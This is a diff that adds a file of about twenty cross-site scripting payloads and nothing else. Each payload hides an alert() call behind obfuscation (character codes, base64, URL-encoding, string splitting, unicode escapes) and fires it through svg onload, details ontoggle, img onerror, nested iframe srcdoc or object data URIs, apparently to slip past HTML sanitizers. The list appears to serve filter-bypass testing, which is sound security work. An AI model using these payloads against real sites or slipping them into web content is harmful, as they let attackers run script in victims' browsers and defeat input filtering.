@@ -1,0 +1,21 @@
+<iframe srcdoc="<svg onload=window['al'+'ert'](2)>"></iframe>
+<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,50,41))>
+<svg onload=setTimeout('al'+'ert(2)',0)>
+<iframe srcdoc="<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,50,41))>"></iframe>
+<object data="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>window['al'+'ert'](3)</script></svg>"></object>
+<svg onload=eval(decodeURIComponent('%61%6C%65%72%74(3)'))>
+<details open ontoggle=eval('al'+'ert(3)')>
+<svg onload=eval(atob('YWxlcnQoNCk='))>
+<iframe srcdoc='<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,52,41))>'></iframe>
+<svg onload=eval(decodeURIComponent('%61%6C%65%72%74%28%34%29'))>
+<object data="data:text/html,<script>window['al'+'ert'](5)</script>"></object>
+<iframe srcdoc="<object data='data:text/html,<svg xmlns=&quot;http://www.w3.org/2000/svg&quot;><script>window[&quot;al&quot;+&quot;ert&quot;](5)</script></svg>'></iframe>">
+<svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+'(5)')>
+<iframe srcdoc='<img src=x onerror=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(5)`)>'></iframe>
+<svg onload=eval(eval('Str'+'ing.fromCharCode')(97,108,101,114,116,40,53,41))>
+<iframe srcdoc="<svg onload=setTimeout('al'+'ert(6)',0)>"></iframe>
+<svg onload=eval(atob('YWxlcnQoNik='))>
+<details open ontoggle=eval(atob('YWxlcnQoNyk='))>
+<object data="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>window['al'+'ert'](7)</script></svg>"></object>
+<iframe srcdoc='<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,55,41))>'></iframe>
+<svg onload=eval(decodeURIComponent('%61%6C%65%72%74(7)'))>
